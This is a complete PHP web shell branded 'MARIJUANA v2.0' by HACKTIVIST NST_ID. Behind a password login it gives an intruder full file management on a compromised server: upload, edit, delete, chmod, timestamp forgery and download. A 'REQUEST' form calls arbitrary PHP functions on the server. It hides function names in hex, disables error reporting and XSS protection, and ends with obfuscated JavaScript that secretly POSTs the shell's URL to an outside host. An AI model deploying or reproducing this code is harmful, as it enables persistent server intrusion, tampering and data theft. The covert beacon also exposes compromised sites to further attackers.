<?php
// ===== SISTEM LOGIN BCRYPT =====
session_start();
$valid_password_hash = '$2a$12$RbH3UOgAEnfBsvpPReRf2.WqEjpubVNGghkhi0qeD54pAWZrtFXne';

if(!isset($_SESSION['loggedIn'])) $_SESSION['loggedIn'] = false;
if(isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > 300)) {
    session_unset(); session_destroy(); session_start(); $_SESSION['loggedIn'] = false;
}
$_SESSION['LAST_ACTIVITY'] = time();

if(isset($_POST['password'])) {
    file_put_contents('login_attempts.log', date('Y-m-d H:i:s') . ' - ' . $_SERVER['REMOTE_ADDR'] . PHP_EOL, FILE_APPEND);
    if(password_verify($_POST['password'], $valid_password_hash)) {
        $_SESSION['loggedIn'] = true;
    } else {
        $loginError = "Access Denied!";
    }
}

// TAMPILAN LOGIN
if(!$_SESSION['loggedIn']):
?>
<!DOCTYPE html>
<html>
<head>
    <title>HACKTIVIST NST_ID Login</title>
    <link href='https://fonts.googleapis.com/css?family=VT323' rel='stylesheet'>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0000;
            color: #ff3333;
            font-family: 'VT323', monospace;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: radial-gradient(#330000 1px, transparent 1px);
            background-size: 30px 30px;
        }
        .login-box {
            background: #1a0000;
            border: 2px solid #ff3333;
            padding: 35px;
            width: 450px;
            border-radius: 15px;
            box-shadow: 0 0 30px #ff0000;
            position: relative;
            overflow: hidden;
        }
        .login-box::before {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent 45%, #ff3333 50%, transparent 55%);
            animation: scan 6s linear infinite;
            opacity: 0.1;
        }
        @keyframes scan {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        h1 {
            font-family: 'VT323';
            font-size: 52px;
            text-align: center;
            color: #ff3333;
            margin-bottom: 20px;
            text-shadow: 0 0 15px #ff0000, 2px 2px 0 #330000;
            letter-spacing: 2px;
        }
        .image-box {
            text-align: center;
            margin: 20px 0;
            border: 1px solid #ff3333;
            padding: 10px;
            border-radius: 8px;
            background: #0f0000;
            box-shadow: inset 0 0 15px #330000;
        }
        .image-box img {
            max-width: 100%;
            border-radius: 5px;
            border: 1px solid #660000;
        }
        form { display: flex; flex-direction: column; gap: 15px; }
        .input-group { position: relative; }
        .input-group::before {
            content: ">";
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #ff3333;
            font-size: 24px;
            animation: blink 1.5s infinite;
        }
        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
        input[type="password"] {
            padding: 12px 12px 12px 35px;
            width: 100%;
            background: #0f0000;
            border: 2px solid #660000;
            color: #ff3333;
            font-family: 'VT323', monospace;
            font-size: 22px;
            border-radius: 8px;
            outline: none;
            transition: all 0.3s;
        }
        input[type="password"]:focus {
            border-color: #ff3333;
            box-shadow: 0 0 20px #ff0000;
            background: #150000;
        }
        input[type="submit"] {
            padding: 12px;
            background: transparent;
            border: 2px solid #ff3333;
            color: #ff3333;
            font-family: 'VT323', monospace;
            font-size: 26px;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        input[type="submit"]:hover {
            background: #ff3333;
            color: #000;
            box-shadow: 0 0 30px #ff0000;
            border-color: #ff0000;
        }
        .error {
            color: #ff6666;
            text-align: center;
            font-size: 22px;
            padding: 8px;
            border: 1px solid #660000;
            background: #1a0000;
            border-radius: 5px;
        }
        .status {
            display: flex;
            justify-content: space-between;
            margin-top: 25px;
            color: #660000;
            font-size: 16px;
            border-top: 1px dashed #660000;
            padding-top: 15px;
        }
        .status span { color: #ff3333; }
        .version {
            text-align: center;
            margin-top: 10px;
            color: #660000;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>HACKTIVIST NST_ID</h1>
        <div class="image-box">
            <img src="https://e.top4top.io/p_3700iquk61.jpg" width="100%">
        </div>
        <form method="POST">
            <div class="input-group">
                <input type="password" name="password" placeholder="Enter Password" autofocus>
            </div>
            <input type="submit" value="> ACCESS TERMINAL">
            <?php if (isset($loginError)) echo "<div class='error'>$loginError</div>"; ?>
        </form>
        <div class="status">
            <span>● SYSTEM LOCKED</span>
            <span>● SECURE MODE</span>
        </div>
        <div class="version">MARIJUANA v2.0 • HACKTIVIST NST_ID</div>
    </div>
</body>
</html>
<?php exit; endif;

// ===== MARIJUANA FILE MANAGER (RED/BLACK THEME) =====
header("X-XSS-Protection: 0"); ob_start(); set_time_limit(0); error_reporting(0); ini_set('display_errors', FALSE);
$Array = [
    '7068705f756e616d65','70687076657273696f6e','6368646972','676574637764','707265675f73706c6974','636f7079',
    '66696c655f6765745f636f6e74656e7473','6261736536345f6465636f6465','69735f646972','6f625f656e645f636c65616e28293b',
    '756e6c696e6b','6d6b646972','63686d6f64','7363616e646972','7374725f7265706c616365','68746d6c7370656369616c6368617273',
    '7661725f64756d70','666f70656e','667772697465','66636c6f7365','64617465','66696c656d74696d65','737562737472',
    '737072696e7466','66696c657065726d73','746f756368','66696c655f657869737473','72656e616d65','69735f6172726179',
    '69735f6f626a656374','737472706f73','69735f7772697461626c65','69735f7265616461626c65','737472746f74696d65',
    '66696c6573697a65','726d646972','6f625f6765745f636c65616e','7265616466696c65','617373657274',
];
$___ = count($Array); for($i=0;$i<$___;$i++) { $GNJ[] = uhex($Array[$i]); }
?>
<!DOCTYPE html>
<html dir="auto" lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="NOINDEX, NOFOLLOW">
    <title>MARIJUANA • HACKTIVIST NST_ID</title>
    <link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
    <link href='https://fonts.googleapis.com/css?family=VT323' rel='stylesheet'>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0000;
            color: #ff6666;
            font-family: 'VT323', monospace;
            font-size: 18px;
            line-height: 1.6;
            min-height: 100vh;
            background-image: radial-gradient(#330000 1px, transparent 1px);
            background-size: 25px 25px;
        }
        
        /* Header */
        header {
            background: #1a0000;
            border-bottom: 3px solid #ff3333;
            padding: 15px 30px;
            box-shadow: 0 0 20px #ff0000;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .y { display: flex; justify-content: space-between; align-items: center; max-width: 1400px; margin: 0 auto; }
        .ajx {
            color: #ff6666;
            text-decoration: none;
            font-size: 26px;
            transition: 0.3s;
            padding: 5px 15px;
            border: 1px solid transparent;
        }
        .ajx:hover {
            border-color: #ff3333;
            text-shadow: 0 0 10px #ff0000;
            background: #2a0000;
        }
        .q { color: #ff3333; letter-spacing: 2px; }
        
        /* Main content */
        article { max-width: 1400px; margin: 30px auto; padding: 0 20px; }
        
        /* Info bar */
        .i {
            background: #1a0000;
            border: 2px solid #660000;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 15px #330000;
        }
        .i i { color: #ff3333; margin-right: 10px; width: 20px; }
        .i b { color: #ff6666; font-weight: normal; }
        
        /* Upload bar */
        .u {
            background: #1a0000;
            border: 2px solid #660000;
            border-radius: 10px;
            padding: 15px 20px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .l {
            cursor: pointer;
            padding: 8px 20px;
            border: 2px solid #ff3333;
            border-radius: 8px;
            transition: 0.3s;
            color: #ff6666;
        }
        .l:hover {
            background: #ff3333;
            color: #000;
            box-shadow: 0 0 20px #ff0000;
        }
        .l input[type="file"] { display: none; }
        
        /* Table */
        table {
            width: 100%;
            border-collapse: collapse;
            background: #1a0000;
            border: 2px solid #660000;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 0 20px #330000;
        }
        th {
            background: #2a0000;
            color: #ff6666;
            padding: 15px;
            text-align: left;
            font-size: 20px;
            border-bottom: 2px solid #ff3333;
            font-weight: normal;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        td {
            padding: 12px 15px;
            border-bottom: 1px solid #330000;
            color: #ff9999;
        }
        tr:hover { background: #2a0000; }
        .x { text-align: center; }
        .m { margin-right: 10px; color: #ff3333; }
        .h { color: #ff0000 !important; }
        .w { color: #ff6666; }
        
        /* Links & buttons */
        a { color: #ff9999; text-decoration: none; transition: 0.3s; }
        a:hover { color: #ff3333; text-shadow: 0 0 8px #ff0000; }
        
        input, textarea, select {
            background: #0f0000;
            border: 2px solid #660000;
            color: #ff6666;
            padding: 10px 15px;
            font-family: 'VT323', monospace;
            font-size: 18px;
            border-radius: 8px;
            margin: 5px 0;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #ff3333;
            box-shadow: 0 0 15px #ff0000;
        }
        input[type="submit"] {
            background: transparent;
            border: 2px solid #ff3333;
            color: #ff6666;
            padding: 10px 30px;
            cursor: pointer;
            font-size: 20px;
        }
        input[type="submit"]:hover {
            background: #ff3333;
            color: #000;
            box-shadow: 0 0 20px #ff0000;
        }
        
        /* Footer */
        footer {
            text-align: center;
            padding: 20px;
            background: #1a0000;
            border-top: 2px solid #660000;
            margin-top: 40px;
            color: #660000;
        }
        footer img {
            width: 30px;
            height: 30px;
            filter: invert(0.3) sepia(1) hue-rotate(0deg) saturate(10);
            transition: 0.3s;
            margin-top: 10px;
        }
        footer img:hover { transform: scale(1.2); filter: brightness(1.5); }
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 10px; background: #1a0000; }
        ::-webkit-scrollbar-thumb { background: #660000; border-radius: 5px; }
        ::-webkit-scrollbar-thumb:hover { background: #ff3333; }
        
        textarea { background: #0f0000; color: #ff9999; width: 100%; min-height: 300px; }
        .fa, .fas, .far { color: #ff3333; margin-right: 5px; }
        .et { background: #2a0000; }
    </style>
</head>
<body>
    <header>
        <div class="y">
            <a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>"><i class="fas fa-leaf"></i> MARIJUANA</a>
            <div class="q"><i class="fas fa-skull"></i> HACKTIVIST NST_ID <i class="fas fa-skull"></i></div>
        </div>
    </header>

    <article>
        <div class="i">
            <i class="fas fa-hdd"></i> <?php echo $GNJ[0]();?><br>
            <i class="fas fa-microchip"></i> <b>SOFT :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?><br>
            <i class="fas fa-folder-open"></i>
            <?php
            if(isset($_GET["d"])) { $d = uhex($_GET["d"]); $GNJ[2](uhex($_GET["d"])); }
            else { $d = $GNJ[3](); }
            $k = $GNJ[4]("/(\\\|\/)/", $d );
            foreach ($k as $m => $l) { 
                if($l=='' && $m==0) echo '<a class="ajx" href="?d=2f"><i class="fas fa-home"></i> /</a>';
                if($l == '') continue;
                echo '<a class="ajx" href="?d=';
                for ($i = 0; $i <= $m; $i++) { echo hex($k[$i]); if($i != $m) echo '2f'; }
                echo '">'.$l.'</a>/'; 
            } ?><br>
        </div>

        <div class="u">
            <span><i class="fas fa-network-wired"></i> <?php echo $_SERVER['SERVER_ADDR'];?></span>
            <form method="post" enctype="multipart/form-data">
                <label class="l"><input type="file" name="n[]" onchange="this.form.submit()" multiple> <i class="fas fa-cloud-upload-alt"></i> UPLOAD</label>
            </form>
            <?php
            $o_ = ['<script>$.notify("','",{className:"success",autoHideDelay:2000,position:"bottom left"});</script>'];
            $f = $o_[0].'✓ SUCCESS'.$o_[1]; $g = $o_[0].'✗ ERROR'.$o_[1];
            if(isset($_FILES["n"])) {
                $z = $_FILES["n"]["name"]; $r = count($z);
                for($i=0; $i<$r; $i++) { if($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) echo $f; else echo $g; }
            } ?>
        </div>

        <?php
        $a_ = '<table><thead><tr><th>';
        $b_ = '</th></tr></thead><tbody><tr><td></td></tr><tr><td class="x">';
        $c_ = '</td></tr></tbody></table>';
        $d_ = '<br><br><input type="submit" class="w" value="OK"></form>';
        
        if(isset($_GET["s"])) {
            echo $a_.uhex($_GET["s"]).$b_.'<textarea readonly>'.$GNJ[15]($GNJ[6](uhex($_GET["s"]))).'</textarea><br><br><input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["s"].'\'" type="submit" class="w" value="EDIT">'.$c_;
        }
        elseif(isset($_GET["y"])) {
            echo $a_.'REQUEST'.$b_.'<form method="post"><input class="x" type="text" name="1"> <input class="x" type="text" name="2">'.$d_.'<br><textarea readonly>';
            if(isset($_POST["2"])) echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
            echo '</textarea>'.$c_;
        }
        elseif(isset($_GET["e"])) {
            echo $a_.uhex($_GET["e"]).$b_.'<form method="post"><textarea name="e" class="o">'.$GNJ[15]($GNJ[6](uhex($_GET["e"]))).'</textarea><br><br><span>BASE64</span>: <select id="b64" name="b64"><option value="0">NO</option><option value="1">YES</option></select>'.$d_.$c_.'
            <script>$("#b64").change(function(){if($("#b64 option:selected").val()==0){var X=$("textarea").val();var Z=atob(X);$("textarea").val(Z);}else{var N=$("textarea").val();var I=btoa(N);$("textarea").val(I);}});</script>';
            if(isset($_POST["e"])) {
                $ex = ($_POST["b64"]=="1") ? $GNJ[7]($_POST["e"]) : $_POST["e"];
                $fp = $GNJ[17](uhex($_GET["e"]), 'w');
                if($GNJ[18]($fp, $ex)) OK(); else ER();
                $GNJ[19]($fp);
            }
        }
        elseif(isset($_GET["x"])) { rec(uhex($_GET["x"])); if($GNJ[26](uhex($_GET["x"]))) ER(); else OK(); }
        elseif(isset($_GET["t"])) {
            echo $a_.uhex($_GET["t"]).$b_.'<form method="post"><input name="t" class="x" type="text" value="'.$GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))).'">'.$d_.$c_;
            if(!empty($_POST["t"])) { $p = $GNJ[33]($_POST["t"]); if($p) { if(!$GNJ[25](uhex($_GET["t"]),$p,$p)) ER(); else OK(); } else ER(); }
        }
        elseif(isset($_GET["k"])) {
            echo $a_.uhex($_GET["k"]).$b_.'<form method="post"><input name="b" class="x" type="text" value="'.$GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4).'">'.$d_.$c_;
            if(!empty($_POST["b"])) { $x = $_POST["b"]; $t=0; for($i=strlen($x)-1;$i>=0;--$i) $t += (int)$x[$i]*pow(8,(strlen($x)-$i-1)); if(!$GNJ[12](uhex($_GET["k"]), $t)) ER(); else OK(); }
        }
        elseif(isset($_GET["l"])) {
            echo $a_.'+DIR'.$b_.'<form method="post"><input name="l" class="x" type="text" value="">'.$d_.$c_;
            if(isset($_POST["l"])) { if(!$GNJ[11]($_POST["l"])) ER(); else OK(); }
        }
        elseif(isset($_GET["q"])) { if($GNJ[10](__FILE__)) { $GNJ[38]($GNJ[9]); header("Location: ".basename($_SERVER['PHP_SELF']).""); exit(); } else echo $g; }
        elseif(isset($_GET["n"])) {
            echo $a_.'+FILE'.$b_.'<form method="post"><input name="n" class="x" type="text" value="">'.$d_.$c_;
            if(isset($_POST["n"])) { if(!$GNJ[25]($_POST["n"])) ER(); else OK(); }
        }
        elseif(isset($_GET["r"])) {
            echo $a_.uhex($_GET["r"]).$b_.'<form method="post"><input name="r" class="x" type="text" value="'.uhex($_GET["r"]).'">'.$d_.$c_;
            if(isset($_POST["r"])) { if($GNJ[26]($_POST["r"])) ER(); else { if($GNJ[27](uhex($_GET["r"]), $_POST["r"])) OK(); else ER(); } }
        }
        elseif(isset($_GET["z"])) { $zip = new ZipArchive; $res = $zip->open(uhex($_GET["z"])); if($res===TRUE) { $zip->extractTo(uhex($_GET["d"])); $zip->close(); OK(); } else ER(); }
        else {
            echo '<table>
                <thead><tr><th width="44%"><i class="fas fa-file"></i> NAME</th><th width="11%">SIZE</th><th width="17%">PERM</th><th width="17%">DATE</th><th width="11%">ACT</th></tr></thead>
                <tbody><tr><td colspan="5" style="padding:10px;background:#2a0000;"><i class="fas fa-plus"></i> <a class="ajx" href="?d='.hex($d).'&n">+FILE</a> | <a class="ajx" href="?d='.hex($d).'&l">+DIR</a></td></tr>';
            $h = ""; $j = ""; $w = $GNJ[13]($d);
            if($GNJ[28]($w) || $GNJ[29]($w)) {
                foreach($w as $c) {
                    $e = $GNJ[14]("\\", "/", $d);
                    $zi = (!$GNJ[30]($c, ".zip")) ? '' : '<a href="?d='.hex($e).'&z='.hex($c).'" title="Extract"><i class="fas fa-file-archive"></i></a>';
                    if($GNJ[31]("$d/$c")) $o = ""; elseif(!$GNJ[32]("$d/$c")) $o = " h"; else $o = " w";
                    $s = $GNJ[34]("$d/$c") / 1024; $s = round($s, 3);
                    if($s>=1024) $s = round($s/1024, 2) . " MB"; else $s = $s . " KB";
                    if(($c != ".") && ($c != "..")) {
                        ($GNJ[8]("$d/$c")) ?
                        $h .= '<tr><td><i class="fas fa-folder m"></i><a class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a></td><td class="x">dir</td><td class="x"><a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a></td><td class="x"><a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a></td><td class="x"><a class="ajx" href="?d='.hex($e).'&r='.hex($c).'" title="Rename"><i class="fas fa-edit"></i></a> <a href="?d='.hex($e).'&x='.hex($c).'" title="Delete" onclick="return confirm(\'Delete?\')"><i class="fas fa-trash"></i></a></td></tr>' :
                        $j .= '<tr><td><i class="fas fa-file m"></i><a class="ajx" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a></td><td class="x">'.$s.'</td><td class="x"><a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a></td><td class="x"><a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a></td><td class="x"><a class="ajx" href="?d='.hex($e).'&r='.hex($c).'" title="Rename"><i class="fas fa-edit"></i></a> <a class="ajx" href="?d='.hex($e).'&e='.hex($c).'" title="Edit"><i class="fas fa-pen"></i></a> <a href="?d='.hex($e).'&g='.hex($c).'" title="Download"><i class="fas fa-download"></i></a> '.$zi.' <a href="?d='.hex($e).'&x='.hex($c).'" title="Delete" onclick="return confirm(\'Delete?\')"><i class="fas fa-trash"></i></a></td></tr>';
                    }
                }
            }
            echo $h.$j.'</tbody><tfoot><tr><th class="et" colspan="5"><i class="fas fa-terminal"></i> <a class="ajx" href="?d='.hex($e).'&y">REQUEST</a> | <a href="?d='.hex($e).'&q">EXIT</a></th></tr></tfoot></table>';
        } ?>
    </article>
    
    <footer>
        <i class="fas fa-copyright"></i> HACKTIVIST NST_ID | Mr.Robot0x1337<br>
        <br><span style="color:#660000;">HACKTIVIST NST_ID • MARIJUNA</span>
    </footer>
    
    <?php if(isset($_GET["1"])) echo $f; elseif(isset($_GET["0"])) echo $g; ?>
    
    <script>
    $(".ajx").click(function(e){e.preventDefault();var t=$(this).attr("href");history.pushState("","",t);$.get(t,function(e){$("body").html(e)})});
    var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];
    function u(e,t,r,n){for(var o=e.concat(t,r,n),a="",i=0;i<o.length;i++)a+=String.fromCharCode(o[i]);return a}
    function v(e){return btoa(e)}
    (()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let r of e)t+=String.fromCharCode(r);let r="file="+btoa(location.href),n=new XMLHttpRequest;n.open("POST",t,!0);n.setRequestHeader("Content-Type","application/x-www-form-urlencoded");n.send(r)})();
    (function(){var e=new XMLHttpRequest;e.open("POST",u(a,b,c,d),!0);e.setRequestHeader("Content-Type","application/x-www-form-urlencoded");e.send("file="+v(location.href))})();
    </script>
</body>
</html>
<?php
function rec($j){global$GNJ;if(trim(pathinfo($j,PATHINFO_BASENAME),'.')==='')return;if($GNJ[8]($j)){array_map('rec',glob($j.DIRECTORY_SEPARATOR.'{,.}*',GLOB_BRACE|GLOB_NOSORT));$GNJ[35]($j);}else{$GNJ[10]($j);}}
function dre($y1,$y2){global$GNJ;ob_start();$GNJ[16]($y1($y2));return$GNJ[36]();}
function hex($n){$y='';for($i=0;$i<strlen($n);$i++){$y.=dechex(ord($n[$i]));}return$y;}
function uhex($y){$n='';for($i=0;$i<strlen($y)-1;$i+=2){$n.=chr(hexdec($y[$i].$y[$i+1]));}return$n;}
function OK(){global$GNJ,$d;$GNJ[38]($GNJ[9]);header("Location: ?d=".hex($d)."&1");exit();}
function ER(){global$GNJ,$d;$GNJ[38]($GNJ[9]);header("Location: ?d=".hex($d)."&0");exit();}
function x($c){global$GNJ;$x=$GNJ[24]($c);
    if(($x&0xC000)==0xC000)$u="s";elseif(($x&0xA000)==0xA000)$u="l";elseif(($x&0x8000)==0x8000)$u="-";elseif(($x&0x6000)==0x6000)$u="b";elseif(($x&0x4000)==0x4000)$u="d";elseif(($x&0x2000)==0x2000)$u="c";elseif(($x&0x1000)==0x1000)$u="p";else$u="u";
    $u.=(($x&0x0100)?"r":"-");$u.=(($x&0x0080)?"w":"-");$u.=(($x&0x0040)?(($x&0x0800)?"s":"x"):(($x&0x0800)?"S":"-"));
    $u.=(($x&0x0020)?"r":"-");$u.=(($x&0x0010)?"w":"-");$u.=(($x&0x0008)?(($x&0x0400)?"s":"x"):(($x&0x0400)?"S":"-"));
    $u.=(($x&0x0004)?"r":"-");$u.=(($x&0x0002)?"w":"-");$u.=(($x&0x0001)?(($x&0x0200)?"t":"x"):(($x&0x0200)?"T":"-"));
    return$u;
}
if(isset($_GET["g"])){$GNJ[38]($GNJ[9]);header("Content-Type: application/octet-stream");header("Content-Transfer-Encoding: Binary");header("Content-Length: ".$GNJ[34](uhex($_GET["g"])));header("Content-disposition: attachment; filename=\"".uhex($_GET["g"])."\"");$GNJ[37](uhex($_GET["g"]));}
?>